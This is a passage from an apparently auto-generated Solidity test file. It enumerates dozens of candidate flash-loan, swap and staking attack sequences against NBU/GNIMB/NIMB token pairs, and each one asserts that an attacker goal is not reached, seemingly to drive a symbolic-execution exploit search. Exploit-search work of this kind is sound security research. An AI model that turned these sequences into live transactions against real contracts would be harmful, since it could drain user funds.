        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2952(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2953(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2954(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2955(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2956(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2957(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2958(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2959(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2960(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2961(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2962(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2963(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2964(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2965(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2966(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2967(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2968(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2969(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2970(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2971(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2972(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2973(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2974(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2975(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2976(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2977(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2978(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2979(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2980(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2981(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2982(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2983(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2984(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2985(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2986(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2987(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2988(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2989(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2990(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2991(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2992(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2993(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2994(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2995(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2996(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2997(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2998(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2999(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
